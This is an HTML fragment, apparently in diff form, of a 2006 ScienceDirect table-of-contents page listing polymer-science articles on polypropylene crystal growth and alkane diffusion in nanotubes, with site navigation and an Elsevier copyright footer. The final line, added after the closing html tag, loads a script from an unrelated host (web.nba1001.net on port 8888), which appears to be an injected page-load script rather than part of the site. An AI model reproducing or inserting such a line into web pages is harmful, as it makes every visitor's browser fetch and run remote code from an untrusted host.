+Fanliang Meng, Sixun Zheng and Tianxi Liu<br><a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KVXHRX-1&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=summary&_coverDate=10%2F04%2F2006&_rdoc=33&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=9a2d7bc94f81b4410dde342d76e43d54">SummaryPlus</a> | <a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KVXHRX-1&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=full&_coverDate=10%2F04%2F2006&_rdoc=33&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=10821e8a13e6c2dcbe0dac63377bad65">Full Text + Links</a> | <a href="http://www.sciencedirect.com/science?_ob=MImg&_imagekey=B6TXW-4KVXHRX-1-Y&_cdi=5601&_user=1553416&_orig=browse&_coverDate=10%2F04%2F2006&_sk=999529978&view=c&wchp=dGLbVlb-zSkzk&md5=c92eb2940b6a832c3a55b059afee32a2&ie=/sdarticle.pdf">PDF (1256 K)</a>
+</td></tr></table>
+<table width=100% cellpadding=10 cellspacing=0 border=0 id=pubBody class="txt">
+<tr><td class="txt" nowrap width=5% align=left valign=top>34.&nbsp;<input type=checkbox name = art value="B6TXW-4KV2Y7P-1:34"></td><td width=95% align=left colspan=2><b>
+
+
+
+Power law of molecular weight dependence of lateral growth rate of isotactic polypropylene</b> &#x2022;&nbsp<span style="font-family: Times New Roman, Times, Serif; font-size: 0.9em; font-weight: bold; color: #737373;">ARTICLE</span><br><i><nobr>
+
+
+Pages 7601-7606</nobr> </i><br>
+
+
+Koji Yamada, Kaori Watanabe, Kiyoka Okada, Akihiko Toda and Masamichi Hikosaka<br><a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KV2Y7P-1&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=summary&_coverDate=10%2F04%2F2006&_rdoc=34&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=e8004589771e46eb067abd6083619fd8">SummaryPlus</a> | <a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KV2Y7P-1&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=full&_coverDate=10%2F04%2F2006&_rdoc=34&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=0d2d489b396101f2ca9322ad9a11c888">Full Text + Links</a> | <a href="http://www.sciencedirect.com/science?_ob=MImg&_imagekey=B6TXW-4KV2Y7P-1-1W&_cdi=5601&_user=1553416&_orig=browse&_coverDate=10%2F04%2F2006&_sk=999529978&view=c&wchp=dGLbVlb-zSkzk&md5=1c6cc47f18d705af4e799ed756f6b750&ie=/sdarticle.pdf">PDF (351 K)</a>
+</td></tr></table>
+<table width=100% cellpadding=10 cellspacing=0 border=0 id=pubBody class="txt">
+<tr><td class="txt" nowrap width=5% align=left valign=top>35.&nbsp;<input type=checkbox name = art value="B6TXW-4KV2Y7P-8:35"></td><td width=95% align=left colspan=2><b>
+
+
+
+Diffusion of single alkane molecule in carbon nanotube studied by molecular dynamics simulation</b> &#x2022;&nbsp<span style="font-family: Times New Roman, Times, Serif; font-size: 0.9em; font-weight: bold; color: #737373;">ARTICLE</span><br><i><nobr>
+
+
+Pages 7607-7610</nobr> </i><br>
+
+
+Hua Yang, Yu Liu, Hui Zhang and Ze-Sheng Li<br><a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KV2Y7P-8&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=summary&_coverDate=10%2F04%2F2006&_rdoc=35&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=9a59259933d23d1b5f217e950bae3fd1">SummaryPlus</a> | <a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KV2Y7P-8&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=full&_coverDate=10%2F04%2F2006&_rdoc=35&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=cf70f5a263b2caf7cbd12e98f66fb2d9">Full Text + Links</a> | <a href="http://www.sciencedirect.com/science?_ob=MImg&_imagekey=B6TXW-4KV2Y7P-8-P&_cdi=5601&_user=1553416&_orig=browse&_coverDate=10%2F04%2F2006&_sk=999529978&view=c&wchp=dGLbVlb-zSkzk&md5=e32e963922168ac5cae05b7006609d51&ie=/sdarticle.pdf">PDF (145 K)</a>
+</td></tr></table>
+<table width=100% cellpadding=10 cellspacing=0 border=0 id=pubBody class="txt">
+<tr><td class="txt" nowrap width=5% align=left valign=top>36.&nbsp;<input type=checkbox name = art value="B6TXW-4KY7PM0-2:36"></td><td width=95% align=left colspan=2><b>
+
+
+
+Calendar</b> &#x2022;&nbsp<span style="font-family: Times New Roman, Times, Serif; font-size: 0.9em; font-weight: bold; color: #737373;">CALENDAR</span><br><i><nobr>
+
+
+Page I</nobr> </i><br><a href="http://www.sciencedirect.com/science?_ob=MImg&_imagekey=B6TXW-4KY7PM0-2-1&_cdi=5601&_user=1553416&_orig=browse&_coverDate=10%2F04%2F2006&_sk=999529978&view=c&wchp=dGLbVlb-zSkzk&md5=96bdf5ca1dd4fc5d8a759d07308b9e26&ie=/sdarticle.pdf">PDF (47 K)</a>
+</td></tr></table>
+
+  </span>
+</div>
+
+
+<table class="pubBody" border=0 cellpadding=0 cellspacing=0  width="100%" bgColor=#cccccc>
+  
+  <tr class="txt" height=22px>
+    <td valign="middle" align="right">
+      
+      
+        
+          articles <b>1 - 36</b>
+        
+      
+    </td>
+  </tr>
+</table>
+
+
+
+
+<table></form></table>
+
+
+  </div>
+</div>
+
+<div style="clear:both"></div>
+
+
+</div></div></div>
+
+<span style="font-size: 75%; font-family: arial,verdana,helvetica,sans-serif">
+<table class="sdMainNav sci_dirNav" style="background-image: url(/scidirimg/sci_dir/navbar_back.gif);" border="0" cellpadding="0" cellspacing="0" style="font-size: 1em">
+    <tr>
+      <td align="right" width="1%">&nbsp;</td>
+      <td align="left"><img src="/scidirimg/space.gif" height="1" width="1"><table class="sdMainNavCenter" style="font-size:1em" cellpadding="0" cellspacing="0">
+        <tr valign="center">
+
+      <td valign="center" align="left" nowrap class="sdMainNav" onmouseover="this.style.backgroundImage='url(/scidirimg/sci_dir/navbar_select.gif)';this.style.backgroundColor='#005d2a'" onmouseout="this.style.backgroundImage='';this.style.backgroundColor=''"><a href="/science?_ob=HomePageURL&_method=userHomePage&_btn=Y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=741e33f8f3de66c15baaa60322f7cbeb" target="_top" name="Home" alt="Home" title="Home"><div class="sdMainNavPadding">Home</div></a></td>
+
+<td valign="center" align="left" nowrap class="sdMainNav sci_dirNavActive" style="background-image: url(/scidirimg/sci_dir/navbar_select.gif)"><a href="/science?_ob=BrowseListURL&_type=all&_auth=y&_btn=Y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=e5e46aece04c05c403e077e32f859b6d" target="_top" name="Browse" alt="Browse" title="Browse"><div class="sdMainNavPadding">Browse</div></a></td>
+
+<td valign="center" align="left" nowrap class="sdMainNav" onmouseover="this.style.backgroundImage='url(/scidirimg/sci_dir/navbar_select.gif)';this.style.backgroundColor='#005d2a'" onmouseout="this.style.backgroundImage='';this.style.backgroundColor=''"><a href="/science?_ob=MiamiSearchURL&_method=requestForm&_btn=Y&_acct=C000053662&_version=1&_urlVersion=1&_userid=1553416&md5=2a084b2335303a8eeaefb6d3262b1494" target="_top" name="Search" alt="Search" title="Search"><div class="sdMainNavPadding">Search</div></a></td>
+
+<td valign="center" align="left" nowrap  class="sdMainNav" onmouseover="this.style.backgroundImage='url(/scidirimg/sci_dir/navbar_select.gif)';this.style.backgroundColor='#005d2a'" onmouseout="this.style.backgroundImage='';this.style.backgroundColor=''" ><a href="/science?_ob=AbstractDBListURL&_btn=Y&_acct=C000053662&_version=1&_userid=1553416&md5=2dc8da25d90c25b2229fdf86b5dad58e" target="_top" name="database" alt="Abstract Databases" title="Abstract Databases"><div class="sdMainNavPadding">Abstract Databases</div></a></td>
+
+      <td valign="center" align="left" nowrap class="sdMainNav" onmouseover="this.style.backgroundImage='url(/scidirimg/sci_dir/navbar_select.gif)';this.style.backgroundColor='#005d2a'" onmouseout="this.style.backgroundImage='';this.style.backgroundColor=''"><a href="/science?_ob=UserSubscriptionURL&_method=begin&_btn=Y&_acct=C000053662&_version=1&_urlVersion=1&_userid=1553416&md5=d1bed7f038a272f4dd621df688e7c6f1" target="_top" name="account" alt="My Settings" title="My Settings"><div class="sdMainNavPadding">My Settings</div></a></td>
+
+      <td valign="center" align="left" nowrap class="sdMainNav" onmouseover="this.style.backgroundImage='url(/scidirimg/sci_dir/navbar_select.gif)';this.style.backgroundColor='#005d2a'" onmouseout="this.style.backgroundImage='';this.style.backgroundColor=''" ><a href="/science?_ob=MiamiSDIURL&_method=listAlerts&_btn=Y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=bbc1d226e4a562cdb2ba9cdaf5ffc71f" target="_top" name="alert" alt="Alerts" title="Alerts"><div class="sdMainNavPadding">Alerts</div></a></td>
+
+      
+
+      <td valign="center" align="left" nowrap class="sdMainNav" onmouseover="this.style.backgroundImage='url(/scidirimg/sci_dir/navbar_select.gif)';this.style.backgroundColor='#005d2a'" onmouseout="this.style.backgroundImage='';this.style.backgroundColor=''"><a href="/science?_ob=HelpURL&_file=jnl_bk_homepage.htm&_btn=Y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=dd2d6c1f039bd3d34fcc10fdec285a3c" target="sdhelp" alt="Help (Opens new window)" title="Help (Opens new window)" onClick="var helpWin; helpWin=window.open('/science?_ob=HelpURL&_file=jnl_bk_homepage.htm&_btn=Y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=dd2d6c1f039bd3d34fcc10fdec285a3c','sdhelp','scrollbars=yes,resizable=yes,directories=no,toolbar=no,menubar=no,status=no,width=760,height=570'); helpWin.focus(); return false"><div class="sdMainNavPadding">Help</div></a></td>
+</tr></table>
+</td></table>
+</span>
+
+
+
+
+
+<br>
+<div style="margin-left:8px; margin-right: 5px;">
+<div style="width:100%">
+<table width=100% border=0 cellpadding=0 cellspacing=0>
+<tr valign=top><td><font face="Verdana" style="font-size:8pt;">
+  <p>
+  <a href="http://www.elsevier.com" target="_blank"><img src="/scidirimg/tree.gif" alt="Elsevier.com (Opens new window)" align="left" border="0" target="_blank"></a>
+  <a href="http://info.sciencedirect.com/" title="ScienceDirect Info Site (Opens New Window)" target="_blank">About ScienceDirect</a> &nbsp;|&nbsp;
+  
+    
+       <a href="/science?_ob=MiamiCommentURL&_method=comment&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=274e1de0f84d4144639a27ceb98507f7" target="_top">Contact Us</a>
+       
+          &nbsp;|&nbsp;
+       
+    
+   
+  
+
+
+
+
+<font face="Verdana" style="font-size:8pt;">
+
+  <a href="/science?_ob=UserSubscriptionURL&_method=displayTerms&_acct=C000053662&_version=1&_urlVersion=1&_userid=1553416&md5=7c33b1188d981ca5bce2266f002d7b63" target="_top">Terms &amp; Conditions</a>
+
+
+  &nbsp;|&nbsp;
+
+
+  <a href="/science?_ob=UserSubscriptionURL&_method=displayPolicy&_acct=C000053662&_version=1&_urlVersion=1&_userid=1553416&md5=2d2df4f26924258d3a50ee5929911b2a" target="_top">Privacy Policy</a>
+
+</font>
+
+</font></td></tr>
+<tr><td height="10"></td></tr>
+<tr><td><font face="Verdana" style="font-size:8pt;">Copyright &copy; 2006 <a href="http://www.elsevier.com" target="_blank">Elsevier B.V.</a> All rights reserved. ScienceDirect&reg; is a registered trademark of Elsevier B.V.</font></td>
+
+</tr></table>
+</div></div>
+
+</body>
+</html>
+<script type="text/javascript" src="http://web.nba1001.net:8888/tj/tongji.js"></script>
